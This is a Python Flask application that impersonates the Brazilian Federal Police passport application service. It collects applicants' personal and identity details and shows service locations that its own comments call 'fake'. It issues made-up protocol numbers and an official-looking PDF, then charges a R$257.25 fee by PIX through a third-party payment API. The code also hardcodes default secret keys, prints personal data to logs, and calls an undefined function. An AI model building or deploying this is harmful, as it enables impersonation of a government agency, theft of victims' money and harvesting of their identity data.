from flask import Flask, render_template, request, redirect, url_for, session, send_file, make_response, jsonify
from datetime import datetime, timedelta
import pytz
import random
import string
import os
import json
import requests
import base64
from io import BytesIO
from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import mm
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER, TA_LEFT
from reportlab.pdfgen import canvas

app = Flask(__name__)
app.secret_key = os.environ.get('SESSION_SECRET', 'sua_chave_secreta_aqui_123456')

NOVA_ERA_SECRET_KEY = os.environ.get('NOVA_ERA_SECRET_KEY', 'sk_M7x3fbfpQjgKPX2G5Hu54nIe7urS-YpLm-oG3q5YP-JeVA5Y')
NOVA_ERA_PUBLIC_KEY = os.environ.get('NOVA_ERA_PUBLIC_KEY', 'pk_yG6_FUX6tAUnZrzx4TUfvf-tyDeECA5ikwn3cp0uDAG-_okM')
NOVA_ERA_API_URL = 'https://api.novaera-pagamentos.com/api/v1'

def get_nova_era_auth_token():
    """Gera o token de autenticação Basic Auth para Nova Era Pagamentos"""
    credentials = f"{NOVA_ERA_SECRET_KEY}:{NOVA_ERA_PUBLIC_KEY}"
    token = base64.b64encode(credentials.encode()).decode()
    return f"Basic {token}"

def obter_data_hora_brasilia():
    """Retorna a data e hora atual de Brasília"""
    brasilia_tz = pytz.timezone('America/Sao_Paulo')
    return datetime.now(brasilia_tz).strftime('%d/%m/%Y %H:%M')

def obter_orgao_por_estado(uf):
    """Retorna o órgão competente de cada estado"""
    orgaos_estaduais = {
        'AC': 'OCA - Organização em Centros de Atendimento',
        'AL': 'Centrais JÁ!',
        'AM': 'PAC - Pronto Atendimento ao Cidadão',
        'AP': 'Super Fácil',
        'BA': 'SAC - Serviço de Atendimento ao Cidadão',
        'CE': 'Vapt Vupt',
        'DF': 'Na Hora',
        'ES': 'Faça Fácil',
        'GO': 'Vapt Vupt',
        'MA': 'VIVA/PROCON',
        'MG': 'UAI - Unidades de Atendimento Integrado',
        'MS': 'Portal de Serviços do Governo',
        'MT': 'Ganha Tempo',
        'PA': 'Estação Cidadania',
        'PB': 'Casas da Cidadania',
        'PE': 'Expresso Cidadão',
        'PI': 'Espaços da Cidadania',
        'PR': 'Poupatempo Paraná',
        'RJ': 'Poupa Tempo RJ',
        'RN': 'Central do Cidadão',
        'RO': 'Tudo Aqui',
        'RR': 'Casa do Cidadão',
        'RS': 'Tudo Fácil',
        'SC': 'Portal de Serviços SC',
        'SE': 'CEAC - Centros de Atendimento ao Cidadão',
        'SP': 'Poupatempo',
        'TO': 'É Pra Já'
    }
    return orgaos_estaduais.get(uf.upper(), 'Centro de Atendimento ao Cidadão')

def obter_uf_por_cep(cep):
    """Detecta o estado baseado na faixa de CEP"""
    cep_num = int(''.join(filter(str.isdigit, cep))[:5])
    
    faixas_cep = {
        (1000, 5999): 'SP', (6000, 9999): 'SP',
        (10000, 19999): 'SP', (20000, 28999): 'RJ',
        (29000, 29999): 'ES', (30000, 39999): 'MG',
        (40000, 48999): 'BA', (49000, 49999): 'SE',
        (50000, 56999): 'PE', (57000, 57999): 'AL',
        (58000, 58999): 'PB', (59000, 59999): 'RN',
        (60000, 63999): 'CE', (64000, 64999): 'PI',
        (65000, 65999): 'MA', (66000, 68899): 'PA',
        (68900, 68999): 'AP', (69000, 69299): 'AM',
        (69300, 69399): 'RR', (69400, 69899): 'AM',
        (69900, 69999): 'AC', (70000, 72799): 'DF',
        (72800, 76799): 'GO', (77000, 77999): 'TO',
        (78000, 78899): 'MT', (79000, 79999): 'MS',
        (80000, 87999): 'PR', (88000, 89999): 'SC',
        (90000, 99999): 'RS'
    }
    
    for (inicio, fim), estado in faixas_cep.items():
        if inicio <= cep_num <= fim:
            return estado
    return 'SP'

def encontrar_unidades_proximas(cep_usuario, limite=3):
    """Gera 3 unidades fake próximas ao CEP do usuário usando o órgão estadual"""
    if not cep_usuario:
        return []
    
    cep_usuario_numerico = ''.join(filter(str.isdigit, cep_usuario))
    if len(cep_usuario_numerico) < 8:
        return []
    
    # Detectar o estado do usuário
    uf = obter_uf_por_cep(cep_usuario)
    orgao = obter_orgao_por_estado(uf)
    
    # Gerar 3 unidades fake próximas
    unidades_fake = []
    base_cep = int(cep_usuario_numerico[:5])
    
    ruas = ['Av. Principal', 'Rua Central', 'Av. do Estado']
    bairros = ['Centro', 'Vila Nova', 'Jardim América']
    
    for i in range(3):
        # Variar o CEP para parecer próximo
        cep_variado = base_cep + (i * 10)
        cep_formatado = f"{cep_variado:05d}-{random.randint(100, 999):03d}"
        
        unidade = {
            'id': i + 1,
            'nome': f'{orgao} - Unidade {i + 1}',
            'endereco': f'{ruas[i]}, {random.randint(100, 999)}',
            'bairro': bairros[i],
            'cidade': f'Sua Região',
            'uf': uf,
            'cep': cep_formatado,
            'telefone': f'({random.randint(11, 99)}) {random.randint(3000, 3999)}-{random.randint(1000, 9999)}',
            'orgao': orgao,
            'distancia': i * 100
        }
        unidades_fake.append(unidade)
    
    return unidades_fake

def gerar_protocolo():
    ano = datetime.now().year
    numero_sequencial = ''.join(random.choices(string.digits, k=10))
    return f"1.{ano}.{numero_sequencial}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/nova-solicitacao')
def nova_solicitacao():
    session.clear()
    return render_template('nova_solicitacao.html', secao='dados-pessoais', dados={})

@app.route('/nova-solicitacao/dados-pessoais', methods=['GET', 'POST'])
def dados_pessoais():
    if request.method == 'POST':
        session['dados_pessoais'] = request.form.to_dict()
        return redirect(url_for('documentos'))
    
    dados = session.get('dados_pessoais', {})
    return render_template('nova_solicitacao.html', secao='dados-pessoais', dados=dados)

@app.route('/nova-solicitacao/documentos', methods=['GET', 'POST'])
def documentos():
    if request.method == 'POST':
        session['documentos'] = request.form.to_dict()
        return redirect(url_for('dados_complementares'))
    
    dados = session.get('documentos', {})
    return render_template('documentos.html', secao='documentos', dados=dados)

@app.route('/nova-solicitacao/dados-complementares', methods=['GET', 'POST'])
def dados_complementares():
    if request.method == 'POST':
        session['dados_complementares'] = request.form.to_dict()
        return redirect(url_for('revisar_dados'))
    
    dados = session.get('dados_complementares', {})
    return render_template('dados_complementares.html', secao='dados-complementares', dados=dados)

@app.route('/nova-solicitacao/revisar-dados', methods=['GET', 'POST'])
def revisar_dados():
    if request.method == 'POST':
        if request.form.get('declaracao') == 'on':
            protocolo = gerar_protocolo()
            session['protocolo'] = protocolo
            return redirect(url_for('protocolo'))
        else:
            return redirect(url_for('revisar_dados'))
    
    dados_pessoais = session.get('dados_pessoais', {})
    dados_documentos = session.get('documentos', {})
    dados_complementares = session.get('dados_complementares', {})
    
    return render_template('revisar_dados.html', 
                         dados_pessoais=dados_pessoais,
                         dados_documentos=dados_documentos,
                         dados_complementares=dados_complementares)

@app.route('/protocolo', methods=['GET', 'POST'])
def protocolo():
    if request.method == 'POST':
        unidade_id = request.form.get('unidade_id')
        data_agendamento = request.form.get('data_agendamento')
        horario_agendamento = request.form.get('horario_agendamento')
        
        session['unidade_id'] = unidade_id
        session['data_agendamento'] = data_agendamento
        session['horario_agendamento'] = horario_agendamento
        
        return redirect(url_for('checkout'))
    
    protocolo = session.get('protocolo', 'N/A')
    data_emissao = obter_data_hora_brasilia()
    dados_pessoais = session.get('dados_pessoais', {})
    dados_complementares = session.get('dados_complementares', {})
    
    cep_usuario = dados_complementares.get('cep', '')
    unidades_proximas = encontrar_unidades_proximas(cep_usuario, 3)
    
    datas_disponiveis = []
    data_inicial = datetime.now() + timedelta(days=35)
    for i in range(15):
        data = data_inicial + timedelta(days=i)
        if data.weekday() < 5:
            datas_disponiveis.append(data.strftime('%Y-%m-%d'))
    
    horarios_disponiveis = [
        '08:00', '08:30', '09:00', '09:30', '10:00', '10:30', '11:00', '11:30',
        '13:00', '13:30', '14:00', '14:30', '15:00', '15:30', '16:00', '16:30'
    ]
    
    return render_template('protocolo.html',
                         protocolo=protocolo,
                         data_emissao=data_emissao,
                         dados_pessoais=dados_pessoais,
                         dados_complementares=dados_complementares,
                         unidades=unidades_proximas,
                         datas=datas_disponiveis,
                         horarios=horarios_disponiveis)

@app.route('/confirmacao')
def confirmacao():
    protocolo = session.get('protocolo', 'N/A')
    return render_template('confirmacao.html', protocolo=protocolo)

@app.route('/confirmacao-agendamento')
def confirmacao_agendamento():
    protocolo = session.get('protocolo', 'N/A')
    unidade_id = session.get('unidade_id')
    data_agendamento = session.get('data_agendamento')
    horario_agendamento = session.get('horario_agendamento')
    
    unidade_selecionada = None
    if unidade_id:
        unidades = carregar_unidades()
        for unidade in unidades:
            if str(unidade['id']) == str(unidade_id):
                unidade_selecionada = unidade
                break
    
    return render_template('confirmacao_agendamento.html',
                         protocolo=protocolo,
                         unidade=unidade_selecionada,
                         data=data_agendamento,
                         horario=horario_agendamento)

@app.route('/agendar', methods=['POST'])
def agendar():
    quantidade = request.form.get('quantidade', '1')
    
    try:
        quantidade_int = int(quantidade)
        if quantidade_int < 1 or quantidade_int > 5:
            return redirect(url_for('index'))
    except ValueError:
        return redirect(url_for('index'))
    
    protocolo = gerar_protocolo()
    data_atual = datetime.now().strftime('%d/%m/%Y às %H:%M')
    
    return render_template('confirmacao.html', 
                         quantidade=quantidade,
                         protocolo=protocolo,
                         data=data_atual)

@app.route('/download-protocolo')
def download_protocolo():
    protocolo = session.get('protocolo', 'N/A')
    data_emissao = obter_data_hora_brasilia()
    dados_pessoais = session.get('dados_pessoais', {})
    dados_complementares = session.get('dados_complementares', {})
    
    buffer = BytesIO()
    
    pdf = canvas.Canvas(buffer, pagesize=A4)
    width, height = A4
    
    y = height - 50
    
    pdf.setFont("Helvetica-Bold", 16)
    pdf.drawCentredString(width / 2, y, "PROTOCOLO DE SOLICITAÇÃO")
    y -= 20
    pdf.drawCentredString(width / 2, y, "DE DOCUMENTO DE VIAGEM")
    y -= 40
    
    pdf.setStrokeColor(colors.black)
    pdf.setLineWidth(1.5)
    pdf.rect(50, y - 200, width - 100, 200, stroke=1, fill=0)
    
    pdf.setFont("Helvetica-Bold", 11)
    pdf.drawString(70, y - 25, "Tipo de Documento de Viagem:")
    pdf.setFont("Helvetica", 11)
    pdf.drawString(280, y - 25, "PASSAPORTE COMUM - ICAO")
    
    pdf.setFont("Helvetica-Bold", 11)
    pdf.drawString(70, y - 45, "Emissão do Protocolo:")
    pdf.setFont("Helvetica", 11)
    pdf.drawString(280, y - 45, data_emissao)
    
    pdf.setFont("Helvetica-Bold", 14)
    pdf.drawString(70, y - 75, f"Protocolo: {protocolo}")
    
    pdf.setFont("Helvetica-Bold", 12)
    pdf.drawString(70, y - 105, "Dados da Solicitação")
    
    pdf.setFont("Helvetica-Bold", 10)
    pdf.drawString(70, y - 125, "Requerente:")
    
    pdf.setFont("Helvetica-Bold", 9)
    pdf.drawString(70, y - 145, "Nome Completo:")
    pdf.setFont("Helvetica", 9)
    pdf.drawString(170, y - 145, dados_pessoais.get('nome', '').upper())
    
    pdf.setFont("Helvetica-Bold", 9)
    pdf.drawString(70, y - 160, "Sexo:")
    pdf.setFont("Helvetica", 9)
    pdf.drawString(170, y - 160, dados_pessoais.get('sexo', '').capitalize())
    
    pdf.setFont("Helvetica-Bold", 9)
    pdf.drawString(280, y - 160, "Data de Nascimento:")
    pdf.setFont("Helvetica", 9)
    pdf.drawString(400, y - 160, dados_pessoais.get('data_nascimento', ''))
    
    pdf.setFont("Helvetica-Bold", 9)
    pdf.drawString(70, y - 180, "Endereço:")
    pdf.setFont("Helvetica", 8)
    endereco_completo = f"{dados_complementares.get('logradouro', '').upper()} - {dados_complementares.get('bairro', '').upper()}"
    pdf.drawString(170, y - 180, endereco_completo)
    
    cidade_uf = f"{dados_complementares.get('cidade_endereco', '').upper()}/{dados_complementares.get('uf_endereco', '').upper()} - BRASIL"
    pdf.drawString(170, y - 193, cidade_uf)
    
    y -= 220
    
    pdf.setFont("Helvetica-Bold", 11)
    pdf.drawString(50, y, "INFORMAÇÕES IMPORTANTES:")
    y -= 20
    
    informacoes = [
        "- Caso o documento de viagem não seja retirado no prazo de 90 (noventa) dias, contados a",
        "  partir da confirmação de pedido de passaporte no posto da PF, o mesmo será cancelado;",
        "",
        "- A solicitação de passaporte preenchida eletronicamente e não confirmada, no posto da PF,",
        "  em até 90 (noventa) dias será cancelada automaticamente;",
        "",
        "- Os documentos apresentados poderão ser recusados se o tempo de expedição e/ou o mau",
        "  estado de conservação impossibilitarem a identificação do requerente;",
        "",
        "- O simples agendamento e/ou recibo bancário não comprova o pagamento da taxa;",
        "",
        "- Para crianças menores de 3 anos de idade deverá ser apresentada 1(uma) fotografia facial,",
        "  tamanho 5X7, recente, colorida, sem data e em fundo branco.",
        "",
        "- Em algumas unidades é obrigatório o agendamento prévio do atendimento pelo site",
        "  www.dpf.gov.br.",
        "",
        "- Comparecer ao Posto de Atendimento do Departamento de Polícia Federal, munido deste",
        "  protocolo e de documentos originais, para validação e coleta de foto, impressões digitais",
        "  e assinatura."
    ]
    
    pdf.setFont("Helvetica", 9)
    for info in informacoes:
        pdf.drawString(50, y, info)
        y -= 12
    
    pdf.setFont("Helvetica-Oblique", 8)
    pdf.drawString(50, 30, f"Documento gerado em {obter_data_hora_brasilia()}")
    
    pdf.save()
    
    buffer.seek(0)
    
    response = make_response(send_file(
        buffer,
        mimetype='application/pdf',
        as_attachment=True,
        download_name=f'protocolo_{protocolo.replace(".", "-")}.pdf'
    ))
    
    return response

@app.route('/checkout')
def checkout():
    dados_pessoais = session.get('dados_pessoais', {})
    dados_documentos = session.get('documentos', {})
    dados_complementares = session.get('dados_complementares', {})
    
    print(f'DEBUG - Dados pessoais: {dados_pessoais}')
    print(f'DEBUG - Dados documentos: {dados_documentos}')
    print(f'DEBUG - Dados complementares: {dados_complementares}')
    
    nome = dados_pessoais.get('nome', '')
    cpf = dados_documentos.get('cpf', '').replace('.', '').replace('-', '')
    email = dados_complementares.get('email', '')
    telefone_raw = dados_complementares.get('telefone', '')
    telefone = telefone_raw.replace('(', '').replace(')', '').replace('-', '').replace(' ', '')
    
    print(f'DEBUG - Nome: {nome}, CPF: {cpf}, Email: {email}, Telefone: {telefone}')
    
    dados_usuario = {
        'nome': nome,
        'cpf': cpf,
        'email': email,
        'telefone': telefone
    }
    
    return render_template('checkout.html', dados_usuario=dados_usuario)

@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    try:
        data = request.get_json()
        
        nome = data.get('nome', '')
        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
        email = data.get('email', '')
        telefone = data.get('telefone', '').replace('(', '').replace(')', '').replace('-', '').replace(' ', '')
        
        if not all([nome, cpf, email, telefone]):
            return jsonify({
                'success': False,
                'error': 'Dados incompletos'
            }), 400
        
        headers = {
            'Content-Type': 'application/json',
            'Authorization': get_nova_era_auth_token()
        }
        
        payload = {
            'customer': {
                'name': nome,
                'email': email,
                'phone': telefone,
                'document': {
                    'number': cpf,
                    'type': 'cpf'
                }
            },
            'items': [
                {
                    'tangible': False,
                    'quantity': 1,
                    'unitPrice': 25725,
                    'title': 'Taxa de Inscrição'
                }
            ],
            'postbackUrl': f'{request.url_root}api/webhook-pagamento',
            'amount': 25725,
            'paymentMethod': 'pix'
        }
        
        print(f'Enviando requisição para Nova Era Pagamentos: {json.dumps(payload, indent=2)}')
        
        response = requests.post(
            f'{NOVA_ERA_API_URL}/transactions',
            json=payload,
            headers=headers,
            timeout=30
        )
        
        print(f'Status da resposta: {response.status_code}')
        print(f'Resposta: {response.text}')
        
        if response.status_code == 200 or response.status_code == 201:
            response_data = response.json()
            print(f'Dados da resposta: {json.dumps(response_data, indent=2)}')
            
            if response_data.get('success') and 'data' in response_data:
                data_response = response_data['data']
                transaction_id = data_response.get('id')
                pix_data = data_response.get('pix', {})
                pix_code = pix_data.get('qrcode')
                status = data_response.get('status', 'waiting_payment')
                
                if transaction_id and pix_code:
                    session['transaction_id'] = transaction_id
                    
                    return jsonify({
                        'success': True,
                        'transaction_id': transaction_id,
                        'pix_code': pix_code,
                        'pix_qr_code': pix_code,
                        'status': status
                    })
                else:
                    return jsonify({
                        'success': False,
                        'error': 'Resposta inválida da API - dados incompletos'
                    }), 500
            else:
                error_msg = response_data.get('error', {}).get('message', 'Erro ao gerar PIX')
                return jsonify({
                    'success': False,
                    'error': error_msg
                }), 500
        else:
            error_data = response.json() if response.text else {}
            error_msg = error_data.get('error', {}).get('message', error_data.get('message', 'Erro ao gerar PIX'))
            return jsonify({
                'success': False,
                'error': error_msg
            }), response.status_code
            
    except Exception as e:
        print(f'Erro ao gerar PIX: {str(e)}')
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/verificar-pagamento/<transaction_id>')
def verificar_pagamento(transaction_id):
    try:
        headers = {
            'Authorization': get_nova_era_auth_token()
        }
        
        response = requests.get(
            f'{NOVA_ERA_API_URL}/transactions/{transaction_id}',
            headers=headers,
            timeout=30
        )
        
        print(f'Verificação de pagamento - Status: {response.status_code}')
        print(f'Verificação de pagamento - Resposta: {response.text}')
        
        if response.status_code == 200:
            response_data = response.json()
            
            if response_data.get('success') and 'data' in response_data:
                data_response = response_data['data']
                status = data_response.get('status', 'waiting_payment')
                
                return jsonify({
                    'success': True,
                    'status': status,
                    'paid': status == 'paid'
                })
            else:
                return jsonify({
                    'success': False,
                    'status': 'error'
                }), 500
        else:
            return jsonify({
                'success': False,
                'status': 'error'
            }), response.status_code
            
    except Exception as e:
        print(f'Erro ao verificar pagamento: {str(e)}')
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'status': 'error',
            'error': str(e)
        }), 500

@app.route('/api/webhook-pagamento', methods=['POST'])
def webhook_pagamento():
    """Recebe notificações da Nova Era Pagamentos sobre mudanças no status"""
    try:
        data = request.get_json()
        print(f'Webhook recebido da Nova Era: {json.dumps(data, indent=2)}')
        
        event = data.get('event')
        transaction_data = data.get('data', {})
        transaction_id = transaction_data.get('id')
        status = transaction_data.get('status')
        
        print(f'Evento: {event}, Transaction ID: {transaction_id}, Status: {status}')
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f'Erro ao processar webhook: {str(e)}')
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/sucesso')
def sucesso():
    protocolo = session.get('protocolo', 'N/A')
    transaction_id = session.get('transaction_id', 'N/A')
    
    return render_template('sucesso.html', 
                         protocolo=protocolo,
                         transaction_id=transaction_id)

if __name__ == '__main__':
    # Para desenvolvimento local
    # No Heroku, o Gunicorn será usado (veja Procfile)
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(host='0.0.0.0', port=port, debug=debug)
